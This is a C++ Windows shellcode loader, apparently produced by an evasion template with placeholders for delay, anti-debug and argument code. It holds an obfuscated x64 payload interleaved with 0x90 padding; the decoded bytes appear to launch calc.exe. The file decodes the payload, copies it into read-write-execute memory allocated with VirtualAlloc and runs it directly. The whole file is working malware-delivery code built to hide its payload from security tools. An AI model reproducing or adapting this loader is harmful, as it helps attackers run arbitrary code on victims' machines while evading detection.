#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>



//####DEFINE####

int nop_decode_a3173e047e894735bf4631454cbca1ee(unsigned char* encoded, int length)
{
    int data_len = 0;
    for (int i = 0; i < length; i++) {
        if (i % 2 == 0){
            encoded[data_len] = encoded[i];
            data_len++;
        }
    }
    return data_len;
}int nop_decode_7b31783dab83498a90ac261b165f0760(unsigned char* encoded, int length)
{
    int data_len = 0;
    for (int i = 0; i < length; i++) {
        if (i % 2 == 0){
            encoded[data_len] = encoded[i];
            data_len++;
        }
    }
    return data_len;
}


DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0xfc,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x83,0x90,0x90,0x90,0xe4,0x90,0x90,0x90,0xf0,0x90,0x90,0x90,0xe8,0x90,0x90,0x90,0xc0,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x51,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x50,0x90,0x90,0x90,0x52,0x90,0x90,0x90,0x51,0x90,0x90,0x90,0x56,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x31,0x90,0x90,0x90,0xd2,0x90,0x90,0x90,0x65,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x52,0x90,0x90,0x90,0x60,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x52,0x90,0x90,0x90,0x18,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x52,0x90,0x90,0x90,0x20,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x72,0x90,0x90,0x90,0x50,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x0f,0x90,0x90,0x90,0xb7,0x90,0x90,0x90,0x4a,0x90,0x90,0x90,0x4a,0x90,0x90,0x90,0x4d,0x90,0x90,0x90,0x31,0x90,0x90,0x90,0xc9,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x31,0x90,0x90,0x90,0xc0,0x90,0x90,0x90,0xac,0x90,0x90,0x90,0x3c,0x90,0x90,0x90,0x61,0x90,0x90,0x90,0x7c,0x90,0x90,0x90,0x02,0x90,0x90,0x90,0x2c,0x90,0x90,0x90,0x20,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0xc1,0x90,0x90,0x90,0xc9,0x90,0x90,0x90,0x0d,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x01,0x90,0x90,0x90,0xc1,0x90,0x90,0x90,0xe2,0x90,0x90,0x90,0xed,0x90,0x90,0x90,0x52,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x51,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x52,0x90,0x90,0x90,0x20,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x42,0x90,0x90,0x90,0x3c,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x01,0x90,0x90,0x90,0xd0,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x80,0x90,0x90,0x90,0x88,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x85,0x90,0x90,0x90,0xc0,0x90,0x90,0x90,0x74,0x90,0x90,0x90,0x67,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x01,0x90,0x90,0x90,0xd0,0x90,0x90,0x90,0x50,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x18,0x90,0x90,0x90,0x44,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x40,0x90,0x90,0x90,0x20,0x90,0x90,0x90,0x49,0x90,0x90,0x90,0x01,0x90,0x90,0x90,0xd0,0x90,0x90,0x90,0xe3,0x90,0x90,0x90,0x56,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0xff,0x90,0x90,0x90,0xc9,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x34,0x90,0x90,0x90,0x88,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x01,0x90,0x90,0x90,0xd6,0x90,0x90,0x90,0x4d,0x90,0x90,0x90,0x31,0x90,0x90,0x90,0xc9,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x31,0x90,0x90,0x90,0xc0,0x90,0x90,0x90,0xac,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0xc1,0x90,0x90,0x90,0xc9,0x90,0x90,0x90,0x0d,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x01,0x90,0x90,0x90,0xc1,0x90,0x90,0x90,0x38,0x90,0x90,0x90,0xe0,0x90,0x90,0x90,0x75,0x90,0x90,0x90,0xf1,0x90,0x90,0x90,0x4c,0x90,0x90,0x90,0x03,0x90,0x90,0x90,0x4c,0x90,0x90,0x90,0x24,0x90,0x90,0x90,0x08,0x90,0x90,0x90,0x45,0x90,0x90,0x90,0x39,0x90,0x90,0x90,0xd1,0x90,0x90,0x90,0x75,0x90,0x90,0x90,0xd8,0x90,0x90,0x90,0x58,0x90,0x90,0x90,0x44,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x40,0x90,0x90,0x90,0x24,0x90,0x90,0x90,0x49,0x90,0x90,0x90,0x01,0x90,0x90,0x90,0xd0,0x90,0x90,0x90,0x66,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x0c,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x44,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x40,0x90,0x90,0x90,0x1c,0x90,0x90,0x90,0x49,0x90,0x90,0x90,0x01,0x90,0x90,0x90,0xd0,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x04,0x90,0x90,0x90,0x88,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x01,0x90,0x90,0x90,0xd0,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x58,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x58,0x90,0x90,0x90,0x5e,0x90,0x90,0x90,0x59,0x90,0x90,0x90,0x5a,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x58,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x59,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x5a,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x83,0x90,0x90,0x90,0xec,0x90,0x90,0x90,0x20,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x52,0x90,0x90,0x90,0xff,0x90,0x90,0x90,0xe0,0x90,0x90,0x90,0x58,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x59,0x90,0x90,0x90,0x5a,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x12,0x90,0x90,0x90,0xe9,0x90,0x90,0x90,0x57,0x90,0x90,0x90,0xff,0x90,0x90,0x90,0xff,0x90,0x90,0x90,0xff,0x90,0x90,0x90,0x5d,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0xba,0x90,0x90,0x90,0x01,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x8d,0x90,0x90,0x90,0x8d,0x90,0x90,0x90,0x01,0x90,0x90,0x90,0x01,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0xba,0x90,0x90,0x90,0x31,0x90,0x90,0x90,0x8b,0x90,0x90,0x90,0x6f,0x90,0x90,0x90,0x87,0x90,0x90,0x90,0xff,0x90,0x90,0x90,0xd5,0x90,0x90,0x90,0xbb,0x90,0x90,0x90,0xf0,0x90,0x90,0x90,0xb5,0x90,0x90,0x90,0xa2,0x90,0x90,0x90,0x56,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0xba,0x90,0x90,0x90,0xa6,0x90,0x90,0x90,0x95,0x90,0x90,0x90,0xbd,0x90,0x90,0x90,0x9d,0x90,0x90,0x90,0xff,0x90,0x90,0x90,0xd5,0x90,0x90,0x90,0x48,0x90,0x90,0x90,0x83,0x90,0x90,0x90,0xc4,0x90,0x90,0x90,0x28,0x90,0x90,0x90,0x3c,0x90,0x90,0x90,0x06,0x90,0x90,0x90,0x7c,0x90,0x90,0x90,0x0a,0x90,0x90,0x90,0x80,0x90,0x90,0x90,0xfb,0x90,0x90,0x90,0xe0,0x90,0x90,0x90,0x75,0x90,0x90,0x90,0x05,0x90,0x90,0x90,0xbb,0x90,0x90,0x90,0x47,0x90,0x90,0x90,0x13,0x90,0x90,0x90,0x72,0x90,0x90,0x90,0x6f,0x90,0x90,0x90,0x6a,0x90,0x90,0x90,0x00,0x90,0x90,0x90,0x59,0x90,0x90,0x90,0x41,0x90,0x90,0x90,0x89,0x90,0x90,0x90,0xda,0x90,0x90,0x90,0xff,0x90,0x90,0x90,0xd5,0x90,0x90,0x90,0x63,0x90,0x90,0x90,0x61,0x90,0x90,0x90,0x6c,0x90,0x90,0x90,0x63,0x90,0x90,0x90,0x2e,0x90,0x90,0x90,0x65,0x90,0x90,0x90,0x78,0x90,0x90,0x90,0x65,0x90,0x90,0x90,0x00,0x90,0x90,0x90};
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = nop_decode_a3173e047e894735bf4631454cbca1ee(encoded, length);length = nop_decode_7b31783dab83498a90ac261b165f0760(encoded, length);

    unsigned char* decoded = encoded;

    printf("\n");
    printf("DEBUG:After XOR:");
    for (size_t i = 0; i < length; i++) {
        printf("0x%02x,", decoded[i]);
    }
    printf("\n\n");

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    esc_main(NULL);
}
